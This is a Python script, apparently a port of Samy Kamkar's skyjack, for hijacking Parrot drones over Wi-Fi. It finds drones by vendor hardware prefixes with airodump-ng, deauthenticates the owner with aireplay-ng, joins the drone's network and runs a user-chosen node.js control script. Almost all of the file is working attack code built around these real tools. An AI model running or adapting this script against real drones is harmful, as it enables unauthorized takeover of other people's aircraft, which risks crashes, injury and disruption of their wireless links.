#!/usr/bin/env python3

'''
This is my python adaptation to Samy Kamkar's (https://github.com/samyk) skyjack perl utility
The basic premise is the same, use airodump to identify APs are parrot drones based on OUI,
deauth users connected to the drone, and then take it over. This tool is guided so users can
specify which interfaces to use to perform the attack against the parrot drone and 
automatically run a users chosen node.js script. Note that this will only work one ONE drone
in vicinity of the scanning interface at a time. Unknown if any additional drones may
break functionality
TODO:
1. Implement regex to identify all clients associated to the AP, save them in a dict, then use
aireplay to deauth only those clients so user can connect simulataneously during attack.
2. Ensure functionality of attacking multiple drones at the same time
3. Integrate dronepwn.sh functions into this script, create menu to for user to select attack
type, either aircrack suite based, iwconfig with telnet based, or perhaps a hybrid of the two
wherein all clients get deauthed from AP and user connects and the script will implement 
issuing telnet commands

End goal is for the entire project to be written solely in python and js. This would make for
a cleaner and easier to read program. This script is the bulk of where the project will lie
in the future, dronepwn bash scripts were created simply out of necessity to get a working
project up and going in the span of 48 hours.
'''

import time
import re
import subprocess
import os

oui = ['90:03:B7', 'A0:14:3D', '00:12:1C', '00:26:7E']

if os.geteuid() != 0:
    print('Must be run as root')
    exit

def cls():
    os.system('clear')
#cls()

def mon():
    global alfa
    global edi
    global alfamon
    print('Please ensure you only have two external wireless cards plugged in while running this program')
    print('Enter the interface name of the Edimax wireless adapter shown below, followed by the alfa card:')
    os.system('airmon-ng')
    edi = input()
    alfa = input()
    print('Attempting to put wireless card in monitor mode...')
    os.system('airmon-ng check kill')
    os.system('airmon-ng start {}'.format(alfa))
#    alfamon = os.popen('airmon-ng | grep -v -i edimax | grep -i realtek | cut -f 2 | tr -d "\\n"').read()
    alfamon = os.popen('ifconfig -a | grep mon | cut -d ":" -f 1 | tr -d " " | tr -d "\\n"').read()
    print(alfamon)
    os.system('ifconfig {} down'.format(edi))
    os.system('ifconfig {} up'.format(edi))

def dump():
    file = '/tmp/dronejack'
    print("Scanning nearby access point for 10 seconds...")
    print(alfamon)
    dumpcmd = "xterm -hold -e bash -c 'airodump-ng {0} -w {1} --output-format csv'".format(alfamon, file)
    subprocess.Popen(dumpcmd, shell=True)
    time.sleep(10)
    os.system('killall xterm')
    

def csv():
#    global bssid
#    global channel
#    global essid
#    bssid = []
#    channel = []
    csv = open('/tmp/dronejack-01.csv', mode='r')
    targets = {}
    for line in csv:
        line = line.rstrip()
        for i in oui:
            targetDrones = re.search('^({}:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(drone\S+),'.format(i), line, re.IGNORECASE)
            if targetDrones:
                '''
                bssid.append(targetDrones.group(1))
                channel.append(targetDrones.group(2))
                essid.append(targetDrones.group(3))
                '''
                targets [targetDrones.group(1)] = (targetDrones.group(2), targetDrones.group(3))
#    print(targets)
    return targets
#samy then changes the channel of the edimax to the channel of the ap, then deauths the legitmate owner, then connects to the ap, then launches the client

#tgtDrones = csv()
#bssid = list(tgtDrones.keys())
#print(tgtDrones)

def attack():
    global tgtDrones
    pwn = input("Enter absolute path to node.js script:\n")
    tgtDrones = csv()
    os.system('service smbd start')
    for i in tgtDrones.keys():
        bssid = i
        channel = tgtDrones[i][0]
        essid = tgtDrones[i][1]
#        cls()
        print('Disabling network manager...')
        os.system('service network-manager stop && service NetworkManager stop && service smbd start')
        print('Changing channel on wireless interface...')
        os.system('iwconfig {0} channel {1}'.format(alfamon, str(channel)))
        print('Sending deauth packets...')
        subprocess.Popen("xterm -e bash -c 'aireplay-ng {0} -0 5 -a {1}'".format(alfamon, bssid), shell=True)
        time.sleep(5)
        print('Connecting to drone...')
        os.system('iwconfig {0} essid {1}'.format(edi, essid))
        print('Getting IP address...')
#        os.system('dhclient -r {0}'.format(edi))
#        os.system('dhclient {0}'.format(edi))
        os.system('ifconfig {0} 192.168.1.10 netmask 255.255.255.0'.format(edi))
        print('Taking over the drone...')
        os.system('nodejs {0}'.format(pwn))

def clean():
#    cls()
    print('Cleaning up...')
    os.system('airmon-ng stop {}'.format(alfamon))
    os.system('rm /tmp/dronejack-*.csv')
    exit()


mon()
dump()
csv()
attack()
clean()
